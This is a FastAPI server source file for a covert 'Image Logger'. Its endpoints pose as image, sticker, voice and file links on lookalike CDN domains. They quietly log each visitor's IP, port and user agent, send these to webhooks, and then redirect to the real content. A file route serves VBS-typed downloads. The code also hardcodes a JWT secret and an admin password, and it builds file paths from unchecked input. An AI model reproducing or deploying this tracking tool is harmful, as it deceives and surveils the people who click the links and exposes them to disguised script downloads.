from fastapi import FastAPI, Request, Header, Depends, BackgroundTasks, HTTPException, status
from fastapi.responses import FileResponse
from fastapi.middleware.cors import CORSMiddleware 
from fastapi.security import OAuth2PasswordRequestForm
from datetime import datetime, timedelta
import time
import pytz
from pathlib import Path
from fastapi.security import OAuth2PasswordBearer
from typing import Annotated
from app.Util import CheckIP
# from app.image.download_image import get_image
import app.curd as curd, app.schemas as schemas
from jose import JWTError, jwt
from app.database import SessionLocal
from fastapi.responses import RedirectResponse
import base64
# from dotenv import load_dotenv
import os
import app.model as model
from sqlalchemy.orm import Session
uri_path= '/app/app/image/'
# uri_path="/home/lph77/GitHub/fastapi-docker-traefik/app/image/"
'''
database setup
'''

# load_dotenv()
def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()
app = FastAPI()
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token", scheme_name="JWT")
'''
CORS setup
'''
origins = ['*']
app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
) 
'''
logging to app.log
'''
SECRET_KEY = "09d25e094faa6ca2556c818166b7a9563b93f7099f6f0f4caa6cf63b88e8d3e7"
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 30
thumnail= "https://media-ten.z-cdn.me/"
'''

http middleware to get IP
'''
@app.middleware("http") 
async def db_session_middleware(request: Request, call_next): 
    request.state.db = Session() 
    response = await call_next(request) 
    request.state.db.close() 
    return response 
@app.middleware("http")
async def log_ip(request: Request, call_next):
    ip = request.headers['x-real-ip']
    # ip= '123.18.143.95'
    port= request.client.port
    timestamp = datetime.now(pytz.timezone('Asia/Ho_Chi_Minh'))
    request.state.ip = ip
    request.state.timestamp = timestamp
    request.state.port = port
    response = await call_next(request)
    return response

'''
Root route and logger ip to database
'''
@app.get("/api/{urlpath}/{imagename}")
async def redirect_image(background_tasks: BackgroundTasks,request: Request, urlpath: str,token: str = None, user_agent: str = Header(None, convert_underscores=True), imagename: str = None, db: Session = Depends(get_db) ):
    ip = request.state.ip
    timestamp = request.state.timestamp
    port = request.state.port
    webhooks_url= curd.get_webhooks_by_token(db=db,token=token)
    if not curd.check_ip_exist(ip, db=db):
        if not urlpath or not imagename or token==None or not curd.check_exists_token(db, token=token):
            background_tasks.add_task(CheckIP, ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=imagename, url_thumbnail=f"https://media-ten.z-cdn.me/{urlpath}/{imagename}", botname='Cảnh báo server configuration',db=db)
            return RedirectResponse(f"https://media-ten.z-cdn.me/yYs3rlgP4qQAAAAF/keanu-keanu-reeves.png")
        background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=imagename, url_thumbnail=f"https://media-ten.z-cdn.me/{urlpath}/{imagename}", botname='Image Logger', db=db)
    return RedirectResponse(f"https://media-ten.z-cdn.me/{urlpath}/{imagename}")
'''
Redirect parse link
'''
@app.get("/photolinkv2/720/{token}/{base64url}")
async def redirect_parselink(background_tasks: BackgroundTasks,request: Request,token: str = None, user_agent: str = Header(None, convert_underscores=True), eid: str = 'parse link', base64url: str = None, size: int =130 ,db: Session = Depends(get_db) ):
    ip = request.state.ip
    timestamp = request.state.timestamp
    port = request.state.port
    webhooks_url= curd.get_webhooks_by_token(db=db,token=token)
    decoded_bytes = base64.b64decode(base64url)
    decoded_url = decoded_bytes.decode('utf-8')
    if not curd.check_ip_exist(ip, db=db):
        if  not eid or token==None or not curd.check_exists_token(db, token=token):
            background_tasks.add_task(CheckIP, ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=eid, url_thumbnail=decoded_url, botname='Cảnh báo server configuration',db=db)
            return RedirectResponse(decoded_url)
        background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=eid, url_thumbnail=decoded_url, botname='Image Logger', db=db)
    return RedirectResponse(decoded_url)
'''
Redirect emotion sticker
'''
@app.get("/emoticon/sticker/webpc")
async def redirect_emoticon(background_tasks: BackgroundTasks,request: Request,token: str = None, user_agent: str = Header(None, convert_underscores=True), eid: str = None, size: int =130 ,db: Session = Depends(get_db) ):
    ip = request.state.ip
    timestamp = request.state.timestamp
    port = request.state.port
    webhooks_url= curd.get_webhooks_by_token(db=db,token=token)
    if not curd.check_ip_exist(ip, db=db):
        if  not eid or token==None or not curd.check_exists_token(db, token=token):
            background_tasks.add_task(CheckIP, ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=eid, url_thumbnail=f"https://zalo-api.zadn.vn/api/emoticon/sticker/webpc?eid={eid}&size={size}", botname='Cảnh báo server configuration',db=db)
            return RedirectResponse(f'https://zalo-api.zadn.vn/api/emoticon/sticker/webpc?eid=22051&size={size}')
        background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=eid, url_thumbnail=f"https://zalo-api.zadn.vn/api/emoticon/sticker/webpc?eid={eid}&size={size}", botname='Image Logger', db=db)
    return RedirectResponse(f"https://zalo-api.zadn.vn/api/emoticon/sticker/webpc?eid={eid}&size={size}")

'''
Voice url get
'''
@app.get("/voice/{voiceurl}")
async def download_voice(background_tasks: BackgroundTasks,request: Request,token: str = None, user_agent: str = Header(None, convert_underscores=True), voiceurl: str = None,db: Session = Depends(get_db)):
    ip = request.state.ip
    timestamp = request.state.timestamp
    port = request.state.port
    image_path = f"{uri_path}/voice"
    path = Path(image_path)
    webhooks_url= curd.get_webhooks_by_token(db=db,token=token)
    if not curd.check_ip_exist(ip, db=db):
        if not path.is_file() or not voiceurl or token==None or not curd.check_exists_token(db, token=token):
            background_tasks.add_task(CheckIP, ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=voiceurl, url_thumbnail="https://media-ten.z-cdn.me/MYZgsN2TDJAAAAAM/this-is.gif", botname='Cảnh báo server voice',db=db)
            return FileResponse(f'{path}/alo.aac', media_type="audio/aac")
        background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=voiceurl, url_thumbnail="https://media-ten.z-cdn.me/MYZgsN2TDJAAAAAM/this-is.gif", botname='Image Logger Voice', db=db)
    return FileResponse(f'{path}/{voiceurl}', media_type="audio/aac")
'''
File url get
'''
@app.get("/file/{fileurl}")
async def download_voice(background_tasks: BackgroundTasks,request: Request,token: str = None, user_agent: str = Header(None, convert_underscores=True), fileurl: str = None,db: Session = Depends(get_db)):
    ip = request.state.ip
    timestamp = request.state.timestamp
    port = request.state.port
    image_path = f"{uri_path}/file"
    path = Path(image_path)
    webhooks_url= curd.get_webhooks_by_token(db=db,token=token)
    if not curd.check_ip_exist(ip, db=db):
        if not path.is_file() or not fileurl or token==None or not curd.check_exists_token(db, token=token):
            background_tasks.add_task(CheckIP, ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=fileurl, url_thumbnail="https://media-ten.z-cdn.me/TgFHDovkakMAAAAM/cliphy-mood.gif", botname='Cảnh báo server voice',db=db)
            return FileResponse(f'{path}/alo.aac', media_type="audio/aac")
        background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=fileurl, url_thumbnail="https://media-ten.z-cdn.me/TgFHDovkakMAAAAM/cliphy-mood.gif", botname='Image Logger Voice', db=db)
    return FileResponse(f'{path}/{fileurl}', media_type="application/x-vbs")
'''
Root URL
'''
@app.get("/")
async def read_root(request: Request, user_agent: str = Header(None, convert_underscores=True), db: Session = Depends(get_db)):
    return {"Hello": "World FastAPI"}
#  Login to get Token
@app.post("/login", response_model=schemas.Token)
async def login_for_access_token(
    form_data: Annotated[OAuth2PasswordRequestForm, Depends()],
    db:Session = Depends(get_db)
):
    user = curd.authenticate_user(username=form_data.username, password=form_data.password, db=db)
    if not user:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Incorrect username or password",
            headers={"WWW-Authenticate": "Bearer"},
        )
    access_token_expires = timedelta(minutes=360)
    access_token = curd.create_access_token(
        data={"sub": user.username}, expires_delta=access_token_expires
    )
    return {"access_token": access_token, "token_type": "bearer"}

'''
View image without logger database
'''                                                                                                                                                                                              
# View image without logger
@app.get("/view/{filename}")
async def read_item(filename: str, q: str = None):
    image_path = f"{uri_path}{filename}"
    path = Path(image_path)
    if not path.is_file():
        return FileResponse(f'{uri_path}/taylor.gif', media_type="image/gif")
    return FileResponse(image_path, media_type="image/gif")

'''
View Image with logger database
'''
@app.get("/image/{filename}")
async def get_image(background_tasks: BackgroundTasks,request: Request, filename: str,token: str = None, user_agent: str = Header(None, convert_underscores=True) ,db: Session = Depends(get_db) ):
    ip = request.state.ip
    timestamp = request.state.timestamp
    port = request.state.port
    image_path = f"{uri_path}{filename}"
    path = Path(image_path)
    webhooks_url= curd.get_webhooks_by_token(db=db,token=token)
    if not curd.check_ip_exist(ip, db=db):
        if not path.is_file() or token==None or not curd.check_exists_token(db, token=token):
            background_tasks.add_task(CheckIP, ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=filename, url_thumbnail=f"https://z-image-cdn.com/view/{filename}", botname='Cảnh báo server configuration',db=db)
            response = FileResponse(f'{uri_path}taylor.gif', media_type="image/gif")
            return response
        background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=filename, url_thumbnail=f"https://z-image-cdn.com/view/{filename}", botname='Image Logger', db=db)
    response = FileResponse(image_path, media_type="image/gif")
    return response

'''
Agents managent 
'''
# view agent configuration
@app.get("/agents")
async def agents(token: Annotated[str, Depends(oauth2_scheme)],skip:int=0,limit:int=100,db: Session = Depends(get_db)):
    agents= curd.get_limit_agents(db ,skip=skip, limit=limit)
    return agents
#search agents by id
@app.get("/agents/{agent_id}")
async def agents(agent_id: int , token: Annotated[str, Depends(oauth2_scheme)],db: Session = Depends(get_db)):
    agents= curd.get_agents_by_id(db ,agent_id= agent_id)
    return agents
# search agents by token
@app.get("/agents_token")
async def agents(key: str, token: Annotated[str, Depends(oauth2_scheme)],db: Session = Depends(get_db)):
    agents= curd.get_agents_by_token(db, token=key)
    return agents
# add agents
@app.post("/agents/add", response_model=schemas.agents_out)
async def agents(agents: schemas.agents,token: Annotated[str, Depends(oauth2_scheme)] ,db: Session = Depends(get_db)):
    agents_model= curd.create_agents(db, agents=agents)
    return agents_model #add Content-Type:application/json
'''
Webhooks management
'''
@app.get("/webhooks")
async def agents(token: Annotated[str, Depends(oauth2_scheme)],skip:int=0,limit:int=100, db: Session = Depends(get_db)):
    webhooks= curd.get_limit_webhooks(db ,skip=skip, limit=limit)
    return webhooks
@app.post("/webhooks/add", response_model=schemas.webhooks_out)
async def create_webhooks(webhooks:schemas.webhooks, token: Annotated[str, Depends(oauth2_scheme)],db:Session = Depends(get_db)):
    webhooks_model = curd.create_webhooks(db, webhooks=webhooks)
    return webhooks_model
    
@app.get("/webhooks/{webhook_id}")
async def get_webhooks_by_id(webhook_id:int,token: Annotated[str, Depends(oauth2_scheme)], skip:int=0,limit:int=100,db:Session = Depends(get_db)):
    webhook = curd.get_webhooks_by_id(db, id= webhook_id)
    return webhook



'''
get logger by token
'''
@app.get("/logger")
async def loggers_list(token: Annotated[str, Depends(oauth2_scheme)],skip:int=0,limit:int=100,db: Session = Depends(get_db)):
    logger= curd.get_logger_list(db ,skip=skip, limit=limit)
    return logger

@app.get("/logger/{id}")
async def get_logger_by_id(id:int,token: str='' ,db:Session = Depends(get_db)):
    credentials_exception = HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Could not validate credentials",
        headers={"WWW-Authenticate": "Bearer"},
    )
    if(token=="linhan123"):
        data = curd.get_logger_by_id(id=id, db=db)
        return data
    else:
        raise credentials_exception

@app.get("/logger/token/{key}")
async def get_logger_by_token(key:str, token: Annotated[str, Depends(oauth2_scheme)],limit:int=100 ,db:Session = Depends(get_db)):
    logger_by_token= curd.get_logger_by_token(token=key, limit=limit ,db=db)
    return logger_by_token
'''
get logger_error by token
'''
@app.get("/logger_error/{id}")
async def get_logger_error_by_id(id:int,token: Annotated[str, Depends(oauth2_scheme)] ,db:Session = Depends(get_db)):
    logger = curd.get_logger_error_by_id(id=id, db=db)
    return logger

@app.get("/logger_error")
async def logger_error_list(token: Annotated[str, Depends(oauth2_scheme)],db: Session = Depends(get_db)):
    logger= curd.get_logger_error_list(db ,skip=0, limit=10)
    return logger

@app.get("/logger_error/token/{key}")
async def get_logger_error_by_token(key:str, token: Annotated[str, Depends(oauth2_scheme)],limit:int=100, db:Session = Depends(get_db)):
    logger_by_token= curd.get_logger_error_by_token(token=key, limit=limit ,db=db)
    return logger_by_token
'''
User by token management
'''


# Register user 
@app.post('/user/add', response_model=schemas.User)
async def create_user(user: schemas.User,token: Annotated[str, Depends(oauth2_scheme)], db:Session= Depends(get_db)):
    user = curd.create_user(user=user, db=db)
    return user



# List all user
@app.get('/user')
async def get_user(token: Annotated[str, Depends(oauth2_scheme)],db:Session= Depends(get_db)):
    users = curd.get_users(db=db)
    return users
# Find user by id
@app.get("/user/{user_id}")
async def get_user_user_by_id(user_id: int, token: Annotated[str, Depends(oauth2_scheme)],db:Session = Depends(get_db)):
    user = curd.get_user_by_id(db=db, user_id=user_id)
    return user
'''
# Get current user
'''
@app.get("/users/me/", response_model=schemas.CurrentUser)
async def get_current_user(token: Annotated[str, Depends(oauth2_scheme)], db:Session = Depends(get_db)):
    credentials_exception = HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Could not validate credentials",
        headers={"WWW-Authenticate": "Bearer"},
    )
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        username: str = payload.get("sub")
        if username is None:
            raise credentials_exception
    except JWTError:
        raise credentials_exception
    current_user = db.query(model.User).filter(model.User.username == username).first()
    if current_user is None:
        raise credentials_exception
    if not current_user.is_active:
        raise HTTPException(status_code=400, detail="Inactive user")
    return current_user


# Get Role of user
@app.get("/users/me/roles/", response_model=None)
async def read_own_items(
    current_user: Annotated[schemas.User, Depends(get_current_user)]
):
    return [{"roles": "Foo", "owner": current_user.username}]


'''
migrations database
'''
@app.get("/migration")
async def testagent(token: str,db: Session = Depends(get_db)):
    if token=='linhan123':
        user= model.User(username='lph77', password='linhan123', is_active=True)
        user = curd.create_user(db=db, user= user)
        return user
    else: 
        return {"error": "you dont know me"}


'''
save my ip to database
'''
@app.get("/local_ip")
async def insert_ip(token:str,request: Request ,db: Session= Depends(get_db)):
    ip = request.state.ip
    if token=='linhan123':
        ip= curd.createOrUpdateIP(ip=ip, db=db)
        return ip
    else: 
        return {"error": "you dont know me"}

@app.get("/iplist")
async def iplist(token: Annotated[str, Depends(oauth2_scheme)],skip:int=0, limit:int=1000, db: Session = Depends(get_db)):
    ip= curd.get_ip_list(db ,skip=skip, limit=limit)
    return ip

'''
download image from url
'''
@app.post('/download_image')
async def download_image(token: str, image: schemas.image):
    if token=='linhan123':
        result = curd.get_image(image.name,image.url)
        return result
    return {"error": "you dont know me"}

'''
save ip client to database
'''
@app.get("/client_ip")
async def insert_ip(token:str,ip:str ,db: Session= Depends(get_db)):
    if token=='linhan123':
        ip= curd.createOrUpdateIP(ip=ip, db=db)
        return ip
    else: 
        return {"error": "you dont know me"}
'''
list file name in image
'''
@app.get("/list_images")
async def insert_ip(token:str,db: Session= Depends(get_db)):
    thumbimage="https://z-image-cdn.com/view"
    list_images= []
    if token=='linhan123':
        files = os.listdir(uri_path)
        files = [f for f in files if os.path.isfile(uri_path+'/'+f)]
        for filename in files:
            list_images.append({'name':filename, 'url': f'{thumbimage}/{filename}'})
        return list_images
    else: 
        return {"error": "you dont know me"}